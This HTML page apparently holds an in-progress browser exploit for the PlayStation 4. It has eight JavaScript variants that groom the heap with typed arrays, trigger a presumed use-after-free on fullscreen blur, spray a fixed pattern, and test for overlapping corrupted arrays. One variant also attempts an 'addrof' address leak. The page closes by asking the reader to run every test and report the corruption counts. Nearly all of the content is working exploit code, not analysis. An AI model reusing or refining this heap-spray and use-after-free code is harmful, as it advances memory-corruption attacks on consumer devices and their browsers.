<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 Exploit Minimal</title>
</head>
<body>

<h1>PS4 EXPLOIT - MINIMAL</h1>

<h2>TESTE 1: 5000 Arrays + Timing Variado</h2>
<button onclick="test1()">EXEC TEST 1</button>
<div id="t1"></div>

<script>
function test1() {
    const r = document.getElementById('t1');
    r.innerHTML = '<p>Creating 5000 arrays...</p>';
    
    const arrays = [];
    const PATTERN = 2.121995791e-314;
    
    for(let i = 0; i < 5000; i++) {
        let a = new Float64Array(64);
        a[0] = i;
        arrays.push(a);
    }
    
    r.innerHTML += '<p>READY - Press OPTIONS now</p>';
    
    const doc = document.documentElement;
    if (doc.webkitRequestFullscreen) doc.webkitRequestFullscreen();
    
    window.onblur = function() {
        r.innerHTML += '<p>UAF triggered</p>';
        
        // Spray
        const spray = [];
        for(let i = 0; i < 8000; i++) {
            let s = new Float64Array(64);
            s.fill(PATTERN);
            spray.push(s);
        }
        
        r.innerHTML += '<p>Spray: 8000</p>';
        
        // Find corrupted
        const corrupted = [];
        for(let i = 0; i < arrays.length; i++) {
            if (arrays[i][0] === PATTERN) {
                corrupted.push(arrays[i]);
            }
        }
        
        r.innerHTML += '<p><b>CORRUPTED: ' + corrupted.length + '</b></p>';
        
        if (corrupted.length >= 2) {
            r.innerHTML += '<p><b>SUCCESS! Testing shared memory...</b></p>';
            
            corrupted[0][30] = 1.111;
            
            if (corrupted[1][30] === 1.111) {
                r.innerHTML += '<p><b>SHARED MEMORY: YES</b></p>';
                
                // addrof
                corrupted[0][40] = {test:1};
                const leak = corrupted[1][40];
                const buf = new ArrayBuffer(8);
                new Float64Array(buf)[0] = leak;
                const addr = new BigUint64Array(buf)[0];
                
                r.innerHTML += '<p>addrof = 0x' + addr.toString(16) + '</p>';
            } else {
                r.innerHTML += '<p>SHARED MEMORY: NO</p>';
                r.innerHTML += '<p>arr[0][30] = ' + corrupted[0][30] + '</p>';
                r.innerHTML += '<p>arr[1][30] = ' + corrupted[1][30] + '</p>';
            }
        }
    };
}
</script>

<hr>

<h2>TESTE 2: Fragmentação Agressiva</h2>
<button onclick="test2()">EXEC TEST 2</button>
<div id="t2"></div>

<script>
function test2() {
    const r = document.getElementById('t2');
    r.innerHTML = '<p>Fragmenting heap...</p>';
    
    // Phase 1: Create + delete pattern
    const temp = [];
    for(let i = 0; i < 2000; i++) {
        temp.push(new Float64Array(64));
    }
    
    // Delete every other
    for(let i = 0; i < temp.length; i += 2) {
        temp[i] = null;
    }
    
    r.innerHTML += '<p>Fragmentation done</p>';
    
    // Phase 2: Main arrays
    const arrays = [];
    const PATTERN = 2.121995791e-314;
    
    for(let i = 0; i < 4000; i++) {
        let a = new Float64Array(64);
        a[0] = i;
        arrays.push(a);
    }
    
    r.innerHTML += '<p>4000 arrays ready - Press OPTIONS</p>';
    
    const doc = document.documentElement;
    if (doc.webkitRequestFullscreen) doc.webkitRequestFullscreen();
    
    window.onblur = function() {
        r.innerHTML += '<p>UAF</p>';
        
        const spray = [];
        for(let i = 0; i < 10000; i++) {
            let s = new Float64Array(64);
            s.fill(PATTERN);
            spray.push(s);
        }
        
        r.innerHTML += '<p>Spray: 10000</p>';
        
        const corrupted = [];
        for(let a of arrays) {
            if (a[0] === PATTERN) corrupted.push(a);
        }
        
        r.innerHTML += '<p><b>CORRUPTED: ' + corrupted.length + '</b></p>';
        
        if (corrupted.length >= 2) {
            r.innerHTML += '<p><b>Testing shared...</b></p>';
            corrupted[0][35] = 2.222;
            r.innerHTML += '<p>arr[0][35] = ' + corrupted[0][35] + '</p>';
            r.innerHTML += '<p>arr[1][35] = ' + corrupted[1][35] + '</p>';
            
            if (corrupted[0][35] === corrupted[1][35]) {
                r.innerHTML += '<p><b>SHARED: YES</b></p>';
            }
        }
    };
}
</script>

<hr>

<h2>TESTE 3: Arrays Pequenos (32 elementos)</h2>
<button onclick="test3()">EXEC TEST 3</button>
<div id="t3"></div>

<script>
function test3() {
    const r = document.getElementById('t3');
    r.innerHTML = '<p>Creating 6000 small arrays...</p>';
    
    const arrays = [];
    const PATTERN = 2.121995791e-314;
    
    for(let i = 0; i < 6000; i++) {
        let a = new Float64Array(32); // Smaller
        a[0] = i;
        arrays.push(a);
    }
    
    r.innerHTML += '<p>READY - Press OPTIONS</p>';
    
    const doc = document.documentElement;
    if (doc.webkitRequestFullscreen) doc.webkitRequestFullscreen();
    
    window.onblur = function() {
        r.innerHTML += '<p>UAF</p>';
        
        const spray = [];
        for(let i = 0; i < 12000; i++) {
            let s = new Float64Array(32);
            s.fill(PATTERN);
            spray.push(s);
        }
        
        r.innerHTML += '<p>Spray: 12000</p>';
        
        const corrupted = [];
        for(let a of arrays) {
            if (a[0] === PATTERN) corrupted.push(a);
        }
        
        r.innerHTML += '<p><b>CORRUPTED: ' + corrupted.length + '</b></p>';
        
        if (corrupted.length >= 2) {
            r.innerHTML += '<p><b>Testing shared...</b></p>';
            corrupted[0][20] = 3.333;
            r.innerHTML += '<p>SHARED: ' + (corrupted[1][20] === 3.333 ? 'YES' : 'NO') + '</p>';
        }
    };
}
</script>

<hr>

<h2>TESTE 4: Arrays Grandes (128 elementos)</h2>
<button onclick="test4()">EXEC TEST 4</button>
<div id="t4"></div>

<script>
function test4() {
    const r = document.getElementById('t4');
    r.innerHTML = '<p>Creating 3000 large arrays...</p>';
    
    const arrays = [];
    const PATTERN = 2.121995791e-314;
    
    for(let i = 0; i < 3000; i++) {
        let a = new Float64Array(128); // Larger
        a[0] = i;
        arrays.push(a);
    }
    
    r.innerHTML += '<p>READY - Press OPTIONS</p>';
    
    const doc = document.documentElement;
    if (doc.webkitRequestFullscreen) doc.webkitRequestFullscreen();
    
    window.onblur = function() {
        r.innerHTML += '<p>UAF</p>';
        
        const spray = [];
        for(let i = 0; i < 6000; i++) {
            let s = new Float64Array(128);
            s.fill(PATTERN);
            spray.push(s);
        }
        
        r.innerHTML += '<p>Spray: 6000</p>';
        
        const corrupted = [];
        for(let a of arrays) {
            if (a[0] === PATTERN) corrupted.push(a);
        }
        
        r.innerHTML += '<p><b>CORRUPTED: ' + corrupted.length + '</b></p>';
        
        if (corrupted.length >= 2) {
            corrupted[0][60] = 4.444;
            r.innerHTML += '<p>SHARED: ' + (corrupted[1][60] === 4.444 ? 'YES' : 'NO') + '</p>';
        }
    };
}
</script>

<hr>

<h2>TESTE 5: Spray ANTES de criar arrays</h2>
<button onclick="test5()">EXEC TEST 5</button>
<div id="t5"></div>

<script>
function test5() {
    const r = document.getElementById('t5');
    r.innerHTML = '<p>Pre-spray...</p>';
    
    const PATTERN = 2.121995791e-314;
    
    // Spray FIRST
    const prespray = [];
    for(let i = 0; i < 5000; i++) {
        prespray.push(new Float64Array(64));
    }
    
    r.innerHTML += '<p>Pre-spray done</p>';
    
    // THEN create controllers
    const arrays = [];
    for(let i = 0; i < 4000; i++) {
        let a = new Float64Array(64);
        a[0] = i;
        arrays.push(a);
    }
    
    r.innerHTML += '<p>READY - Press OPTIONS</p>';
    
    const doc = document.documentElement;
    if (doc.webkitRequestFullscreen) doc.webkitRequestFullscreen();
    
    window.onblur = function() {
        r.innerHTML += '<p>UAF</p>';
        
        const spray = [];
        for(let i = 0; i < 8000; i++) {
            let s = new Float64Array(64);
            s.fill(PATTERN);
            spray.push(s);
        }
        
        r.innerHTML += '<p>Spray: 8000</p>';
        
        const corrupted = [];
        for(let a of arrays) {
            if (a[0] === PATTERN) corrupted.push(a);
        }
        
        r.innerHTML += '<p><b>CORRUPTED: ' + corrupted.length + '</b></p>';
        
        if (corrupted.length >= 2) {
            corrupted[0][30] = 5.555;
            r.innerHTML += '<p>SHARED: ' + (corrupted[1][30] === 5.555 ? 'YES' : 'NO') + '</p>';
        }
    };
}
</script>

<hr>

<h2>TESTE 6: Dual Spray (2 fases de spray)</h2>
<button onclick="test6()">EXEC TEST 6</button>
<div id="t6"></div>

<script>
function test6() {
    const r = document.getElementById('t6');
    r.innerHTML = '<p>Creating arrays...</p>';
    
    const arrays = [];
    const PATTERN = 2.121995791e-314;
    
    for(let i = 0; i < 4500; i++) {
        let a = new Float64Array(64);
        a[0] = i;
        arrays.push(a);
    }
    
    r.innerHTML += '<p>READY - Press OPTIONS</p>';
    
    const doc = document.documentElement;
    if (doc.webkitRequestFullscreen) doc.webkitRequestFullscreen();
    
    window.onblur = function() {
        r.innerHTML += '<p>UAF</p>';
        
        // First spray
        const spray1 = [];
        for(let i = 0; i < 4000; i++) {
            let s = new Float64Array(64);
            s.fill(PATTERN);
            spray1.push(s);
        }
        
        r.innerHTML += '<p>Spray 1: 4000</p>';
        
        // Small delay
        for(let i = 0; i < 1000000; i++) {}
        
        // Second spray
        const spray2 = [];
        for(let i = 0; i < 4000; i++) {
            let s = new Float64Array(64);
            s.fill(PATTERN);
            spray2.push(s);
        }
        
        r.innerHTML += '<p>Spray 2: 4000</p>';
        
        const corrupted = [];
        for(let a of arrays) {
            if (a[0] === PATTERN) corrupted.push(a);
        }
        
        r.innerHTML += '<p><b>CORRUPTED: ' + corrupted.length + '</b></p>';
        
        if (corrupted.length >= 2) {
            corrupted[0][30] = 6.666;
            r.innerHTML += '<p>SHARED: ' + (corrupted[1][30] === 6.666 ? 'YES' : 'NO') + '</p>';
        }
    };
}
</script>

<hr>

<h2>TESTE 7: Array MUITO grande (256 elementos)</h2>
<button onclick="test7()">EXEC TEST 7</button>
<div id="t7"></div>

<script>
function test7() {
    const r = document.getElementById('t7');
    r.innerHTML = '<p>Creating 2000 huge arrays...</p>';
    
    const arrays = [];
    const PATTERN = 2.121995791e-314;
    
    for(let i = 0; i < 2000; i++) {
        let a = new Float64Array(256);
        a[0] = i;
        arrays.push(a);
    }
    
    r.innerHTML += '<p>READY - Press OPTIONS</p>';
    
    const doc = document.documentElement;
    if (doc.webkitRequestFullscreen) doc.webkitRequestFullscreen();
    
    window.onblur = function() {
        r.innerHTML += '<p>UAF</p>';
        
        const spray = [];
        for(let i = 0; i < 4000; i++) {
            let s = new Float64Array(256);
            s.fill(PATTERN);
            spray.push(s);
        }
        
        r.innerHTML += '<p>Spray: 4000</p>';
        
        const corrupted = [];
        for(let a of arrays) {
            if (a[0] === PATTERN) corrupted.push(a);
        }
        
        r.innerHTML += '<p><b>CORRUPTED: ' + corrupted.length + '</b></p>';
        
        if (corrupted.length >= 2) {
            corrupted[0][100] = 7.777;
            r.innerHTML += '<p>SHARED: ' + (corrupted[1][100] === 7.777 ? 'YES' : 'NO') + '</p>';
        }
    };
}
</script>

<hr>

<h2>TESTE 8: Criar arrays EM LOOP com delay</h2>
<button onclick="test8()">EXEC TEST 8</button>
<div id="t8"></div>

<script>
function test8() {
    const r = document.getElementById('t8');
    r.innerHTML = '<p>Creating arrays with delays...</p>';
    
    const arrays = [];
    const PATTERN = 2.121995791e-314;
    
    // Create in batches
    for(let batch = 0; batch < 10; batch++) {
        for(let i = 0; i < 400; i++) {
            let a = new Float64Array(64);
            a[0] = (batch * 400) + i;
            arrays.push(a);
        }
        // Small delay between batches
        for(let d = 0; d < 10000; d++) {}
    }
    
    r.innerHTML += '<p>4000 arrays ready - Press OPTIONS</p>';
    
    const doc = document.documentElement;
    if (doc.webkitRequestFullscreen) doc.webkitRequestFullscreen();
    
    window.onblur = function() {
        r.innerHTML += '<p>UAF</p>';
        
        const spray = [];
        for(let i = 0; i < 8000; i++) {
            let s = new Float64Array(64);
            s.fill(PATTERN);
            spray.push(s);
        }
        
        r.innerHTML += '<p>Spray: 8000</p>';
        
        const corrupted = [];
        for(let a of arrays) {
            if (a[0] === PATTERN) corrupted.push(a);
        }
        
        r.innerHTML += '<p><b>CORRUPTED: ' + corrupted.length + '</b></p>';
        
        if (corrupted.length >= 2) {
            corrupted[0][30] = 8.888;
            r.innerHTML += '<p>SHARED: ' + (corrupted[1][30] === 8.888 ? 'YES' : 'NO') + '</p>';
        }
    };
}
</script>

<hr>

<h2>LOG SUMMARY</h2>
<p>Execute todos os 8 testes e me envie:</p>
<pre>
TEST 1: CORRUPTED = ?
TEST 2: CORRUPTED = ?
TEST 3: CORRUPTED = ?
TEST 4: CORRUPTED = ?
TEST 5: CORRUPTED = ?
TEST 6: CORRUPTED = ?
TEST 7: CORRUPTED = ?
TEST 8: CORRUPTED = ?

Qual teve mais de 1 corrompido?
</pre>

</body>
</html>
